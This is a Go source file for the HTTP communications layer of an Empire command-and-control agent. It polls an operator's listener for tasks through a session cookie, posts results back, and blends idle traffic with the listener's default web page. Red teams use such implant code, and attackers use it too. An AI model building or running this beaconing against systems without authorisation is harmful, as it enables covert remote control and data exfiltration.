package comms

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

// RequestKind tells Send which half of the Empire HTTP contract a routing
// packet belongs to. The packet itself is encrypted, so the caller must say.
// Staging (stage 1 in dh.go, stage 2 in main.template) keeps its direct
// http.Post calls and never goes through Send.
type RequestKind int

const (
	RequestTasking RequestKind = iota // poll for tasking (meta 4): GET / malleable "get" section
	RequestData                       // results (meta 5): POST / malleable "post" section
)

// HttpMessageSender owns the outbound HTTP path for the agent. In the plain
// (non-malleable) build it only drives the legacy pipe-split path; when the
// `malleable` build tag is set, http_malleable.go populates `malleable` with
// a *MalleableProfile and trySendMalleable takes over. Keeping `malleable`
// as interface{} lets base-build code stay agnostic to the malleable types
// (which only exist in malleable-tagged files) while still allocating one
// pointer slot's worth of storage for them.
type HttpMessageSender struct {
	Headers         map[string]string
	TaskURIs        []string
	Server          string
	SessionCookie   string // cookie name carrying the routing packet on tasking GETs ("" = "session")
	DefaultResponse []byte // the listener's default page: what it serves for an idle poll, accepted results and (http listener) a rejected packet
	client          *http.Client

	// Only populated when the `malleable` build tag is active — see
	// http_malleable.go. Declared as interface{} here so this file compiles
	// without the malleable types.
	malleable interface{}
}

// requestTimeout bounds every request through Send, body included, so a hung
// connection surfaces as a missed check-in instead of blocking the agent loop
// forever. The cost: a tasking or result body that takes longer than this to
// transfer is a miss (tasking) or silently lost (results).
const requestTimeout = 120 * time.Second

// NewHttpMessageSender builds a sender from the raw template variables.
// defaultPage is the listener's decoded default response. Only drives the
// legacy pipe-split path; malleable builds use NewMalleableHttpMessageSender
// (http_malleable.go) instead.
func NewHttpMessageSender(server string, headers map[string]string, legacyProfile, sessionCookie string, defaultPage []byte) *HttpMessageSender {
	if strings.HasSuffix(server, "/") {
		server = server[:len(server)-1]
	}
	if !strings.HasPrefix(server, "http://") && !strings.HasPrefix(server, "https://") {
		server = "http://" + server
	}

	var taskURIs []string
	parts := strings.Split(legacyProfile, "|")
	if parts[0] != "" {
		taskURIs = strings.Split(parts[0], ",")
	}

	return &HttpMessageSender{
		Headers:         headers,
		TaskURIs:        taskURIs,
		Server:          server,
		SessionCookie:   sessionCookie,
		DefaultResponse: defaultPage,
		client:          &http.Client{Timeout: requestTimeout},
	}
}

func (sender *HttpMessageSender) cookieName() string {
	if sender.SessionCookie == "" {
		return "session"
	}
	return sender.SessionCookie
}

// httpClient returns the sender's client. Constructor-built senders always
// have one; the nil guard only serves struct literals in tests and is not
// synchronised, so production code must not rely on it.
func (sender *HttpMessageSender) httpClient() *http.Client {
	if sender.client == nil {
		sender.client = &http.Client{Timeout: requestTimeout}
	}
	return sender.client
}

// checkStatus maps a non-200 status onto Send's error contract.
func checkStatus(code int) error {
	switch {
	case code == 200:
		return nil
	case code == 401:
		return ErrSessionUnknown
	default:
		return fmt.Errorf("http %d", code)
	}
}

// Send issues one request. It returns (nil, nil) when the server had nothing
// for us: an idle poll, accepted results, or (http listener) a routing packet
// it rejected and answered with its default page. 401 → ErrSessionUnknown;
// other non-200 → "http <code>"; see poll.go for how polls are classified.
func (sender *HttpMessageSender) Send(kind RequestKind, routingPacket []byte) ([]byte, error) {
	if handled, resp, err := sender.trySendMalleable(kind, routingPacket); handled {
		return resp, err
	}
	return sender.sendLegacy(kind, routingPacket)
}

// sendLegacy is the pipe-split-profile path: tasking requests GET a random
// task URI with the routing packet in the session cookie; results POST it as
// the body. This mirrors the Python/PowerShell agents.
func (sender *HttpMessageSender) sendLegacy(kind RequestKind, routingPacket []byte) ([]byte, error) {
	if len(sender.TaskURIs) == 0 {
		return nil, ErrNoTaskURIs
	}
	requestURI := sender.Server + sender.TaskURIs[rand.Intn(len(sender.TaskURIs))]

	var req *http.Request
	var err error
	if kind == RequestTasking {
		req, err = http.NewRequest("GET", requestURI, nil)
	} else {
		req, err = http.NewRequest("POST", requestURI, bytes.NewReader(routingPacket))
	}
	if err != nil {
		return nil, err
	}
	for k, v := range sender.Headers {
		req.Header.Set(k, v)
	}
	if kind == RequestTasking {
		// Per request, never stored in sender.Headers: a poll's cookie must
		// not ride along on the next results POST.
		req.Header.Set("Cookie", sender.cookieName()+"="+base64.StdEncoding.EncodeToString(routingPacket))
	}

	resp, err := sender.httpClient().Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if err := checkStatus(resp.StatusCode); err != nil {
		return nil, err
	}
	if len(body) == 0 {
		// Never a valid answer from the http listener. Checked before the
		// default-page compare: bytes.Equal(nil, empty) is true, so an empty
		// DefaultResponse must not turn an empty body into "idle".
		return nil, ErrEmptyResponse
	}
	if bytes.Equal(body, sender.DefaultResponse) {
		return nil, nil // the http listener's "no tasking"
	}
	return body, nil
}
